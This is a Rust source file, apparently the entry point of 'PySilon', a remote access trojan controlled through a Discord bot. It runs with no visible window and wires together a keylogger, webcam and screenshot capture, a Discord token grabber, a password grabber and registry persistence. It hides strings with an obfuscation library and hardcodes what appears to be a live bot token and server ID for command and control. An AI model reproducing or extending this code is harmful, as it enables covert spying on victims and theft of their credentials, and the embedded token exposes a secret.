#![windows_subsystem = "windows"]
use std::collections::HashMap;
use obfstr::*;
use discord_bot::DiscordBot;
use serde_json::Value;
use once_cell::sync::Lazy;
use sysinfo::{System, SystemExt, RefreshKind, ProcessRefreshKind};
use tokio::sync::Mutex;
pub mod keylogger;
pub mod webcam;
pub mod wifi;
pub mod screenshot;
pub mod processes;
pub mod tree;
pub mod download;
pub mod upload;
mod discord_token_grabber;
mod discord_bot;
mod registry;
mod password_grabber;
static BOT_TOKENS: Lazy<Mutex<Vec<String>>>= Lazy::new(|| Mutex::new(Vec::new()));
static SOFTWARE_REGISTRY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("PySilon".into()));
static SOFTWARE_DIRECTORY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("PySilon".into()));
static SOFTWARE_EXECUTABLE_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("PySilon".into()));
static CHANNEL_IDS: Lazy<Mutex<HashMap<&str, Option<u64>>>>= Lazy::new(|| Mutex::new(HashMap::new()));
static SERVER_ID: Lazy<Mutex<u64>>= Lazy::new(|| Mutex::new(968675227494137936));
static CATEGORY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(String::new()));
static BOT_TO_SEND: Lazy<Mutex<Vec<Value>>>= Lazy::new(|| Mutex::new(Vec::new()));
static MESSAGE_INTERACTION: Lazy<Mutex<HashMap<String, Value>>>= Lazy::new(|| Mutex::new(HashMap::new()));
static SYS: Lazy<Mutex<System>>= Lazy::new(|| Mutex::new(System::new_with_specifics(RefreshKind::new().with_processes(ProcessRefreshKind::everything()))));
static PROXIES: Lazy<Mutex<Vec<String>>>= Lazy::new(|| Mutex::new(Vec::new()));
static PROXY_ALL: Lazy<Mutex<bool>>= Lazy::new(|| Mutex::new(false));
static PYSILON_KEY: Lazy<Vec<u8>>= Lazy::new(|| obfbytes!(include_bytes!("key.pysilon")).to_vec());
#[tokio::main]
async fn main() {
    BOT_TOKENS.lock().await.push(obfstr!("MTA1NDE1NjAwMzU5MzE2Mjg3Mg.Gh61zT.BgLjhX_uVPCk8O852lCYl729nlrbqGDl4uiPJs").to_string());
    let mut channel_ids= CHANNEL_IDS.lock().await;
    channel_ids.insert("info", None);
    channel_ids.insert("main", None);
    channel_ids.insert("spam", None);
    channel_ids.insert("file", None);
    channel_ids.insert("recordings", None);
    channel_ids.insert("voice", None);
    drop(channel_ids);
    registry::main().await;
    let discord_bot= tokio::spawn(async {DiscordBot::main().await});
    discord_bot.await.unwrap();
}